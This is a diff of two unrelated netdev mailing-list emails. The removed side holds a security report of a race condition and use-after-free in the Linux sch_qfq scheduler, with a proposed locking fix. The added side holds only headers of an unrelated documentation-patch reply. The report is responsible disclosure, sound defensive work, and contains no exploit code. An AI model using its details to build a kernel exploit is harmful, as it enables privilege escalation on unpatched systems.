@@ -1,495 +1,298 @@
-Return-Path: <netdev+bounces-202393-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-202394-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
-Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
-	by mail.lfdr.de (Postfix) with ESMTPS id 7EE4BAEDB3C
-	for <lists+netdev@lfdr.de>; Mon, 30 Jun 2025 13:36:44 +0200 (CEST)
+Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
+	by mail.lfdr.de (Postfix) with ESMTPS id AE4FEAEDB7B
+	for <lists+netdev@lfdr.de>; Mon, 30 Jun 2025 13:44:55 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 1C9183A40A2
-	for <lists+netdev@lfdr.de>; Mon, 30 Jun 2025 11:36:18 +0000 (UTC)
+	by sv.mirrors.kernel.org (Postfix) with ESMTPS id BB0673A48E4
+	for <lists+netdev@lfdr.de>; Mon, 30 Jun 2025 11:44:29 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id C292E25DCF2;
-	Mon, 30 Jun 2025 11:36:39 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 69D16272E6E;
+	Mon, 30 Jun 2025 11:44:49 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b="RKug/YmV"
+	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="CWKHqZro"
 X-Original-To: netdev@vger.kernel.org
-Received: from mail-pf1-f182.google.com (mail-pf1-f182.google.com [209.85.210.182])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.15])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CCBF323D287
-	for <netdev@vger.kernel.org>; Mon, 30 Jun 2025 11:36:37 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.182
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1751283399; cv=none; b=aHx04dVjLa6m+RhFOT7JTjJSMcQgBnHAO0TEcCil901JOB4GcaUWJMFr6iT9lyosr6RHntS7fTlALCC4cHLZ5jY8n+6H4RVDciavS/EQVYwtJ6k70KG2jWIUWdQuIVjE2JlgYW9jwz1Hryw7iorIKgWupLptMtiPss2dK2+UGGI=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1751283399; c=relaxed/simple;
-	bh=TlWbz/Xv1LfW4ATl9oI6aRo18nuqsW8japyQGP0NZhg=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=H4cNc9wSKlQChEwCDgRKfjSSoxCDeIdkAYFQTrGsr0KSqQ+gWqvVddgfTK+SYUQGquNVwak8k5QOjvE5q8hK4ti1YUs9F6FxHqV0EzOX9aGurf7Bv8rCAyRsIm9py5Hc8cyXq91Tnr2Ia+dqnHMcxallnAzkiWjvPATZuOvjk1o=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b=RKug/YmV; arc=none smtp.client-ip=209.85.210.182
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com
-Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=mojatatu.com
-Received: by mail-pf1-f182.google.com with SMTP id d2e1a72fcca58-747fba9f962so3987599b3a.0
-        for <netdev@vger.kernel.org>; Mon, 30 Jun 2025 04:36:37 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=mojatatu-com.20230601.gappssmtp.com; s=20230601; t=1751283397; x=1751888197; darn=vger.kernel.org;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=UGR4tgF+WZbJ0/gPKq0QFkiVZOL/L5i22m6w3MiAbhM=;
-        b=RKug/YmV0Qc9A0LxthjvbcAdXzd4MFex3brhhDuheSc6Mv9QMTaQToLjMMvPTAUPrH
-         Vq2309EyHbWqHQgR9+KDvJqcO7SXEedDBcpxLydM2MuXR8q2Onh4c1jiufaAjc6fhAU1
-         tCpYsW3svp6mf43DpW1qV+At57bxgVjROmVPBQiNr7UG0vePhL4bK9bBE6v8G2ANmNWp
-         annBrl/BoiiajJwvS427TkeUD5foJ4K5Va/1DZQZ4YB3h/c5UmALsQ50TxPPhLgsOoQP
-         rcRHJmwN5cL+TSfJY3m5TlCiYjbBrQq/w0QEmrDm026ECM+MgpHXv6jWI3OyvcCKRzV1
-         Vf0A==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1751283397; x=1751888197;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
-         :subject:date:message-id:reply-to;
-        bh=UGR4tgF+WZbJ0/gPKq0QFkiVZOL/L5i22m6w3MiAbhM=;
-        b=b3A3XkNqB1bzm9nY5cCHXfsLmYAeOYdnAqv7o7rUhwhYk7N6d40utmZJB07N4pGSxR
-         9x6gpnC4tjmOyJgbyAz796Tq5ea+TOFlL2BeNX/Zf33huXygBEEYF3IqbePnBflzpbyb
-         +QyMuQG8rTxi68F6zTUWW0sbKhxLV2D1xdfRA8T4C2Y5/6WYFcRNFksGuFvyEinrbHtm
-         Ji7S3EOjjR3SNldE3ah8XWVab6NnuT9C898XgPWc+Tj6S/177ZlaC7T/LT15LKnD9C+/
-         MxI1haVuIQrHIu8hs7kwEkXOg+b03qihvNzP+RWjvmffjRIJRZ1gjd2qgLDo5UVhg9PE
-         5n2A==
-X-Forwarded-Encrypted: i=1; AJvYcCWE+c5x9oTafhTN3/Ds02p89/xRYf2ge1m2P46Q70KNHwsZeYZWLRD7gf+38dTQm3+pMnq9New=@vger.kernel.org
-X-Gm-Message-State: AOJu0YwUwsrwvdX9Hzn63SLst0H2TrF16ZkIhhkExKkMb0TFV9BGmFxI
-	L4LmRMpLyg8VwGjNjtv4E1oL1OQ3SYA+3YPEz6Sp7O+bbLLT9vXk2Y2+NN3rEv8/23tDaDBK9vM
-	80jtWLPRa36gMWuBzsbabTyA7QaA2fv/9Vhi5AUgT
-X-Gm-Gg: ASbGncv+DTNOK5TvFhhoRtB6+Accs5NfTvZDhw10cMmVWaD/sZLkq6fqB6MKc2dUbIR
-	kAOnBlTFh7cNanqybKhOf8UfmVMsgva6OYUg68otGl+e02ZNBkyHHPkiayGtsMQoR6q0bKkpZSz
-	VLCdoC4sJgeY1n0tAOQMht3m11EhlXGSnjGwAM28JeWQ==
-X-Google-Smtp-Source: AGHT+IFtANPGU6vKx9QjF5izygfbFrVRYChqJf54LwtW77QdALsylIuQl/wITE3zacTnWL4tJs5lwECP4sqWCUWSk9k=
-X-Received: by 2002:a05:6a00:10d5:b0:746:25d1:b712 with SMTP id
- d2e1a72fcca58-74af7ace890mr16994843b3a.7.1751283396905; Mon, 30 Jun 2025
- 04:36:36 -0700 (PDT)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AFBAA2727EA;
+	Mon, 30 Jun 2025 11:44:47 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=192.198.163.15
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1751283889; cv=fail; b=kyyYRrvm/dzFV+AvEsYMx+wsN6DyHdRkmPo7ck/h4NJy/jWsDI6kIKDdOjrq4xig3hl1EHJTtQ2ESy9uoQ7cavkVIADie1fM94wwYph47AF/epH78GT146cqPtD43nnfvKs0+AMS6iaiCc4oY40F5Uye9Mqyeimmn3QZTIgYRUc=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1751283889; c=relaxed/simple;
+	bh=kgP+4jxc+FTq0jssfIc5ysvX+RXp+zKhHWvOaxAmgco=;
+	h=Date:From:To:CC:Subject:Message-ID:References:Content-Type:
+	 Content-Disposition:In-Reply-To:MIME-Version; b=jZ56N8T9FOOoPS/4PhPgA6yTtovWq9JqmFJtSyBrVKJ6rQ5lmKI8bWWtzdQziQz+IQwmBBjUqEiMBDR4u+3Gsxr9jrjhVs5B/NwM29uQjKxympxr2oM+whmmA8KdB4aOiD+B7L5qYcmFW1kFRUndAtdxj1mll51hRvkEgznvSpE=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=CWKHqZro; arc=fail smtp.client-ip=192.198.163.15
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
+  t=1751283887; x=1782819887;
+  h=date:from:to:cc:subject:message-id:references:
+   in-reply-to:mime-version;
+  bh=kgP+4jxc+FTq0jssfIc5ysvX+RXp+zKhHWvOaxAmgco=;
+  b=CWKHqZroQp01HV3+vsvwHdIQSRhbxcsKlFu/B6SprPLc0R+NR1DTNUd3
+   rLj033JKz6R7jakopvvsdcjDD/FEpt/Q4BiPi0/fbJ7ih+e0vBOqm6thw
+   E0/BOuqUewOzi9y8zYrVuNSY4fcMvt5AccTTsxWXGY6jOPq0na0Z611Bn
+   ZPRhvbFuTTBwriIPnTbhsC5Eyx1KDHcBsKjErnKtOBHfD45Nrla4l1/Dp
+   fnqa+TvKMixuo/Psji99q2UYcFCQZZuH49IJsZ1Dm+AWRbw4dX0rC+hW6
+   WMKBL/hDIjNRR+qLWJg95ABPJ+LX0hbfbaxJgKRTpfIZ5zBkW3iUkGnMx
+   w==;
+X-CSE-ConnectionGUID: WopQjhErQvGMSJDZD1ODgg==
+X-CSE-MsgGUID: yb/vEZdnT+OGz6mfX/SjWQ==
+X-IronPort-AV: E=McAfee;i="6800,10657,11479"; a="53655603"
+X-IronPort-AV: E=Sophos;i="6.16,277,1744095600"; 
+   d="scan'208";a="53655603"
+Received: from orviesa001.jf.intel.com ([10.64.159.141])
+  by fmvoesa109.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 30 Jun 2025 04:44:46 -0700
+X-CSE-ConnectionGUID: X/ilfro2Q6+gwR2KAQK1uQ==
+X-CSE-MsgGUID: HzS29fuKSTms3Mskwlsh2g==
+X-ExtLoop1: 1
+X-IronPort-AV: E=Sophos;i="6.16,277,1744095600"; 
+   d="scan'208";a="190606386"
+Received: from orsmsx902.amr.corp.intel.com ([10.22.229.24])
+  by orviesa001.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 30 Jun 2025 04:44:46 -0700
+Received: from ORSMSX902.amr.corp.intel.com (10.22.229.24) by
+ ORSMSX902.amr.corp.intel.com (10.22.229.24) with Microsoft SMTP Server
+ (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.2.1544.25; Mon, 30 Jun 2025 04:44:45 -0700
+Received: from ORSEDG902.ED.cps.intel.com (10.7.248.12) by
+ ORSMSX902.amr.corp.intel.com (10.22.229.24) with Microsoft SMTP Server
+ (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.2.1544.25 via Frontend Transport; Mon, 30 Jun 2025 04:44:45 -0700
+Received: from NAM11-CO1-obe.outbound.protection.outlook.com (40.107.220.88)
+ by edgegateway.intel.com (134.134.137.112) with Microsoft SMTP Server
+ (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.2.1544.25; Mon, 30 Jun 2025 04:44:45 -0700
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=lTXHMgymJ4aZHIKnKmK6UBXV2ihbfkVBPkGZNatdkyECGCglQblIsMx8ZLNgK0amgqQZTgY3MJJvUJz2SoL2SBU43g0CSfWw5KPvoYiAj5Hofes+aWw7ddx3MFqGHGACpWuayj4RHqQijw3F106xXOqpWX0rFRZ8S4OAl8dqBa77iYPpcBzkXTxpPeDAuNQ/k8j9pDCvbX59im+VruY0+D9we9FnHjiDm8xDV5iDZqUhfHqaXau0eAAMKDycCY9RK/jUvHqse1muKOBgJlBdtxP1CGpIkvU2+kGcAIBS+GLjhyVGNH7A4LXndJ5NxEniyNuVmrZyBTPMudd3PKX8zQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=03urOnF0/AS289Ki/rYmY+K9RpU5w81JiPzlQJussW4=;
+ b=VN/FRF9bW5VM2zAp/VbjKUdRIX46KA5GDniSNbPoU/I42413cjJv0x6sZSJlTzFAzZWRfo7bwfmrI5ffDmJZ6ut9j1A9X4arxpjjAwpfnCoMBlqLKvdQKOClY21EF7BYDTKUA7daqqZHv/NEKEij95LIIfRi6sE98CqlXW0BcGn/P0j61kyIbxJwuxfSmITBjlkC2+K30lg5qvM/FSEMNq4vXKtynj53WS1x89HRxdy7UGxmRwCg64W5gRf/cu1ux66W/hzoGukrB6m/nnh27Z1mrNxy1hF5dVITDm1e8NVtj6fitUHHnWe6bbnZJpj3uNSgv7bUc+E0oSM+weUjGA==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=intel.com; dmarc=pass action=none header.from=intel.com;
+ dkim=pass header.d=intel.com; arc=none
+Authentication-Results: dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=intel.com;
+Received: from DM4PR11MB6117.namprd11.prod.outlook.com (2603:10b6:8:b3::19) by
+ MN2PR11MB4663.namprd11.prod.outlook.com (2603:10b6:208:26f::14) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.8880.30; Mon, 30 Jun
+ 2025 11:44:43 +0000
+Received: from DM4PR11MB6117.namprd11.prod.outlook.com
+ ([fe80::d19:56fe:5841:77ca]) by DM4PR11MB6117.namprd11.prod.outlook.com
+ ([fe80::d19:56fe:5841:77ca%2]) with mapi id 15.20.8880.024; Mon, 30 Jun 2025
+ 11:44:43 +0000
+Date: Mon, 30 Jun 2025 13:44:34 +0200
+From: Maciej Fijalkowski <maciej.fijalkowski@intel.com>
+To: Jason Xing <kerneljasonxing@gmail.com>
+CC: <davem@davemloft.net>, <edumazet@google.com>, <kuba@kernel.org>,
+	<pabeni@redhat.com>, <bjorn@kernel.org>, <magnus.karlsson@intel.com>,
+	<jonathan.lemon@gmail.com>, <sdf@fomichev.me>, <ast@kernel.org>,
+	<daniel@iogearbox.net>, <hawk@kernel.org>, <john.fastabend@gmail.com>,
+	<joe@dama.to>, <willemdebruijn.kernel@gmail.com>, <bpf@vger.kernel.org>,
+	<netdev@vger.kernel.org>, Jason Xing <kernelxing@tencent.com>
+Subject: Re: [PATCH net-next] Documentation: xsk: correct the obsolete
+ references and examples
+Message-ID: <aGJ4ohHA3Cs45wCp@boxer>
+References: <20250628120841.12421-1-kerneljasonxing@gmail.com>
+Content-Type: text/plain; charset="us-ascii"
+Content-Disposition: inline
+In-Reply-To: <20250628120841.12421-1-kerneljasonxing@gmail.com>
+X-ClientProxiedBy: VI1PR06CA0152.eurprd06.prod.outlook.com
+ (2603:10a6:803:a0::45) To DM4PR11MB6117.namprd11.prod.outlook.com
+ (2603:10b6:8:b3::19)
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <CAPpSM+SKOj9U8g_QsGp8M45dtEwvX4B_xdd7C0mP9pYu1b4mzA@mail.gmail.com>
- <CAM0EoMn+UiSmpH=iBeevpUN5N8TW+2GSEmyk6vA2MWOKgsRjBA@mail.gmail.com> <aGIAbGB1VAX-M8LQ@xps>
-In-Reply-To: <aGIAbGB1VAX-M8LQ@xps>
-From: Jamal Hadi Salim <jhs@mojatatu.com>
-Date: Mon, 30 Jun 2025 07:36:24 -0400
-X-Gm-Features: Ac12FXy1N5WK6re36QhGONkc6X5xWcfPvJ6_qZiYfseUbgehJbKLMyqSLjvGf7I
-Message-ID: <CAM0EoMnBoCpc7hnK_tghXNMWy+r7nKPGSsKrJiHoQo=G8F6k=A@mail.gmail.com>
-Subject: Re: sch_qfq: race conditon on qfq_aggregate (net/sched/sch_qfq.c)
-To: Xiang Mei <xmei5@asu.edu>
-Cc: security@kernel.org, 
-	Linux Kernel Network Developers <netdev@vger.kernel.org>, Cong Wang <xiyou.wangcong@gmail.com>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: DM4PR11MB6117:EE_|MN2PR11MB4663:EE_
+X-MS-Office365-Filtering-Correlation-Id: 0abd751c-6847-45bb-df32-08ddb7cb8147
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam: BCL:0;ARA:13230040|1800799024|366016|7416014|376014;
+X-Microsoft-Antispam-Message-Info: =?us-ascii?Q?kg+8Vt6goZ4uo3suyRD06HhHamaYUoqoUlzrdI75ib7EinOaPdEdQL66QXdq?=
+ =?us-ascii?Q?5fiRNHXdNbvjkFM+PnIQZ8szCjzcj7JQlkyzNHrPKcNONbRxISy9HwSffc75?=
+ =?us-ascii?Q?mJTVsJp8KWcEkthpFv9ladTFdGm67E/BrXA06CknkfbPXfepg9SAmZHsoqmd?=
+ =?us-ascii?Q?OayJoY4tcG9UOkM/WAVgs6JeZhJVRLb0+5CFpG1hfB+BbHqrS52uDjdlwe2T?=
+ =?us-ascii?Q?wwgz7FmYv3moCDIC3xPqi5vXBjwbdatQxRVmHtdJGogMMZnz48hJx522u0qT?=
+ =?us-ascii?Q?FVdefDBhpZEjHDP7XiBRiDQ6ugJ5KbeERnwFjulcjSpRm4pRwzocepURpV9d?=
+ =?us-ascii?Q?DuD9kHOoXioxLchNQfFnfbPK7ZXE3KwVwagTxD1ZYVy14FAuilnaJZl26aKY?=
+ =?us-ascii?Q?L4LTNi4oBc5CWVjZDjaNf8Zs8oJdws46igkrTtNk5YZRv9rFK4ckjuzDaZ+C?=
+ =?us-ascii?Q?hB+lDlWovh3CuPTZJ98ghtXwz9Xyk2NaS5XUWFqFgsu4zV0atCMbk+/42x6z?=
+ =?us-ascii?Q?2tNLoMmhSpeAsTIddZEMlcIh8aGDmasNk5alivKS7vk5pwMcx+vKIltK2plf?=
+ =?us-ascii?Q?E3GTn1Isi5wqquTg73yF6EByUh/77WpaX5BQD7iqVTLwapXVIQ5otdzStZJO?=
+ =?us-ascii?Q?z0EWqYqkZrLx5C08dMAseuj8x2csAcD0lWSu8vnCLg+GL42c3Zd3DdtrAW0m?=
+ =?us-ascii?Q?XA7v4bwWyi4CHyIvrqIX270zU+qdCbHR1AlCxI+atT3USC+dCov7JN4kYmXN?=
+ =?us-ascii?Q?6anUPRuzzGyb7nl9BBQd+Ayf/hnnadIM3rb8WveAONXhDi9iVNx88JpX8GkW?=
+ =?us-ascii?Q?38SDz1WJBjw+PC2pg5wEtH4Ez+Qu2BxmWzsEXnTZmQWlj2tSyeJrijkNGq8T?=
+ =?us-ascii?Q?rJHie5hs/2uB60pc4HCdUNZ6X6dsdRWdsHuvrie73aii0+hptpKcfBakGTFv?=
+ =?us-ascii?Q?hMfv1lPskAByElBfUPdPrduL0KK2ipk19OuXrXpZ8n/UCIPYx9VLgaimoKlE?=
+ =?us-ascii?Q?WV0REmAWZ8NRZP6U2IeENdbvHcJK7nhuSw0FCcyxQagG5IvERdLts55jaA0/?=
+ =?us-ascii?Q?OaVdzXpdJ61iV3LW3QyLhfVhG3vMqLhugbAA4de76ioDy4+oT4p9wJLK8RVv?=
+ =?us-ascii?Q?YcW99YDJtuPO4zcEZxRYQ8DCPkXY9GyOObYt4uMH8Nrl9tv7vgk9aE1nQU66?=
+ =?us-ascii?Q?kcQsNF5ynbAmq7Pub8Q2G2sPKZvgzkDQZm5llXz9Ed6cAwEXJoIOO+H/y6Td?=
+ =?us-ascii?Q?j2ly3Od4QoSp0h/ZpUSbqGpeW3UAGC6eYCtZDW8CtZx5Trsh87yAYITbAcwo?=
+ =?us-ascii?Q?/ISfzL9C/V47bc/0D0adcgVcVuKerUwAkYktUkj65ehCcqdGwQRcBr8An4NE?=
+ =?us-ascii?Q?ZxZzTB3KejonZA4yqafZw6S5EZJlPkdDxewHggPKYMsMi+Ty363UgWN4NalG?=
+ =?us-ascii?Q?EQf0eRNouOA=3D?=
+X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DM4PR11MB6117.namprd11.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(366016)(7416014)(376014);DIR:OUT;SFP:1101;
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0: =?us-ascii?Q?r7SddJWwNgR1rahEKHfZyIh4LosvZ6Za2Pu6H1XlgL5Qcb7LqpKJTg/68+8G?=
+ =?us-ascii?Q?pIP42ICv1M1DNkeWuTZVWvrmLvkvaqo5lVVQd8pUL3C7aDzREdoaRdPv0Age?=
+ =?us-ascii?Q?oIlSEiIReKLmXi/zpDKt1csfJVzMmMT0GI62N3MhuSFo8ObvL8KMw9W06Slo?=
+ =?us-ascii?Q?tb8+duV4rmuAqwVDAsiZgnaVeUl8Egz4EUxzLhwb1tiXO+9JE29syYoOPXcQ?=
+ =?us-ascii?Q?GpUpqOV/za36x1V8gn43/PPODv4gQt9P2T8l/zNDl/AZjrq6zciIOAW20G6X?=
+ =?us-ascii?Q?yGev/In1tTQdqlw5GW0GYf8SgZ5XuvNY0OxJfCsi6OAoo0qqQZM4wFKkn8N5?=
+ =?us-ascii?Q?IOOiQq0qb4QX9dqSacDjafrXwNz/qLC9er6cJ9AtxBBuqcP/iywHQTx+DVz5?=
+ =?us-ascii?Q?T8YxNXTAxwIYd2oMimKbJk+NC7JW94+jfYYmrKhZXUWNFRYFvRXq+xYsbu3R?=
+ =?us-ascii?Q?2QEtDFdVmwuKNg00lrnlPRpSQ5lj1BLDPMw1SQPhhHFKd46lmOheeAnXs8UF?=
+ =?us-ascii?Q?wqkLd7RdQI1EqIAMGuCba/WbMVUqmt6AMluCmwcS+xR2g8+hxkwlStu8KMgc?=
+ =?us-ascii?Q?15CfAAmbvXZqtXBxpkSNYHJSmdD0kbR09oPE/XTcMh0QmCTdXxSywN8yYCiU?=
+ =?us-ascii?Q?ZKvLLuBqASVk4a55oUvv15fRw37BZRN5t5blGCtPnAtPb7ea+d3X8VsrPrIp?=
+ =?us-ascii?Q?pyLj83ja6c8B6SpNVjGvFy2A17y9Q4Y8oFvVegpk+SdTsXZMTb3xUgQALqfq?=
+ =?us-ascii?Q?NdreO1O8ViSt6BPTKmXyJ16b8J+XN+zaGdu1MwbBCFD19oojgpFU4/LklASI?=
+ =?us-ascii?Q?2huAbul2gTl5HgR49Sd4yBulCDOlFhzzy2mlEkmLOrcHtETPYxRB00cLOE49?=
+ =?us-ascii?Q?8mhntDIKYOdBa0fDKM6vZp5e4goV5B3GygXFbZNsiaNjdYONIS5jlGFQ3r8r?=
+ =?us-ascii?Q?2aJbPw7RYQSojm2aF2FRl27WnE4iq0Z6L/Ir4l6+k63uifnv4xxLGpW5okrQ?=
+ =?us-ascii?Q?Fc7SOkOiCkmcIooEb2XM74Ke3oi2+VXFcUmGQcURRcXXR2fLy2vKrwF1bmd+?=
+ =?us-ascii?Q?GAN+VW/r6MnTdfkiSk6UoTFsGo3QxwITs50UykzhRqHap1AZrIMtiu/8g9zG?=
+ =?us-ascii?Q?dCfcMpSE0eDNxp+wGY2LOguv6xK2lv5WiJxckSwaZWXvE4Nf/TB8E690kcGS?=
+ =?us-ascii?Q?MVo1Av45cW8Nn4dPncKhuYCnU+oxwGAFj7jR1y65pttQQK9FeZb/o6d1sZeN?=
+ =?us-ascii?Q?kztFqeE8zvlovh/SOob7Ga02VTLh5p3+YWtmbo570SU6DR1zQoNrd0hrpm9q?=
+ =?us-ascii?Q?EDeDCDXtYMUydS5ChPUwZ04Mh54wuMtjV+GhhZWn8xZNQv53yYULuUk2/ROA?=
+ =?us-ascii?Q?Djsgsdduh03e70AHu1+gr25yMQH/2vSzvHypuABFMBZYdvlL0NjAKjrl8ZKx?=
+ =?us-ascii?Q?633TQAlb7TBLFtfFhs/tJ1ewy8K3I3aeqKEJFE7hNL5Y4tjeCIIFBAtA+XGs?=
+ =?us-ascii?Q?r1+7GdrDNs+/mjbzud0/vaC9eNi2tg6GAFWqw8BAMWz+qgSV0CzjfhzJ2iEm?=
+ =?us-ascii?Q?iu3SrBH5y0kSBL4/1Q16RxUSLLpxst5lJrm17YYacm2222tE5Wwg1OYnwz7I?=
+ =?us-ascii?Q?Rg=3D=3D?=
+X-MS-Exchange-CrossTenant-Network-Message-Id: 0abd751c-6847-45bb-df32-08ddb7cb8147
+X-MS-Exchange-CrossTenant-AuthSource: DM4PR11MB6117.namprd11.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 30 Jun 2025 11:44:43.3118
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 46c98d88-e344-4ed4-8496-4ed7712e255d
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: NS2JZ3XrAyWYGAvY+08xW7My8zkwm3JqwSlht2gVIuXPGz7d4liCoxUUkkvV/drQbk3z9ccIohpPCSQvqqxaumGrpKLXbI3YcnmBIhTqNX0=
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: MN2PR11MB4663
+X-OriginatorOrg: intel.com
 
-On Sun, Jun 29, 2025 at 11:11=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
->
-> On Sun, Jun 29, 2025 at 10:28:12AM -0400, Jamal Hadi Salim wrote:
-> > On Sun, Jun 29, 2025 at 3:13=E2=80=AFAM Xiang Mei <xmei5@asu.edu> wrote=
-:
-> > >
-> > > Linux Kernel Security Team,
-> > >
-> > > We are writing to bring to your attention a race condition vulnerabil=
-ity in net/sched/sch_qfq.c.
-> > >
-> > > In function qfq_delete_class, the line `qfq_destroy_class(sch, cl);` =
-is outside the protection of ` sch_tree_lock`, so any operation on agg coul=
-d lead to a race condition vulnerability. For example, we can get a UAF by =
-racing it with qfq_change_agg in qfq_enqueue.
-> > >
-> > > We verified it on v6.6.94 and exploited it in kernelCTF cos-109-17800=
-.519.32.
-> > > A temporal fix could be
-> > > ```c
-> > > @@ -558,10 +562,9 @@ static int qfq_delete_class(struct Qdisc *sch, u=
-nsigned long arg,
-> > >
-> > >  qdisc_purge_queue(cl->qdisc);
-> > >  qdisc_class_hash_remove(&q->clhash, &cl->common);
-> > > -
-> > > +        qfq_destroy_class(sch, cl);
-> > >  sch_tree_unlock(sch);
-> > >
-> > > -       qfq_destroy_class(sch, cl);
-> > >  return 0;
-> > >  }
-> > > ```
-> > >
-> > > But this only avoids the exploitation. There are other places to expl=
-oit the vulnerability with a General Protection (usually null-deref). We fo=
-und two places that can crash the kernel:
-> > >
-> > > 1. When modifying an existing class in  qfq_change_class, the reads o=
-f cl->agg->weight or cl->agg->lmax could lead to GPs.
-> > > 2. Reads of agg content in qfq_dump_class could lead to GPs.
-> > >
-> > > These reads of the agg structure may require `RCU` or `lock` to prote=
-ct.
-> > >
-> > > Looking forward to hearing from you and discussing the patching.
-> > >
-> >
-> >
-> > Please partake in the discussion to fix this, your other issue and
-> > others on the netdev list, start with this thread:
-> > https://lore.kernel.org/netdev/aF847kk6H+kr5kIV@pop-os.localdomain/
->
-> Thanks so much for your time and the helpful information.
->
-> Here is a potential patch to this vulnerability:
->
-> sch_lock was used to protect the read/write options of aggs. The
-> lock may influence the performance of the scheduler, and RCU could also
-> be a patch option.
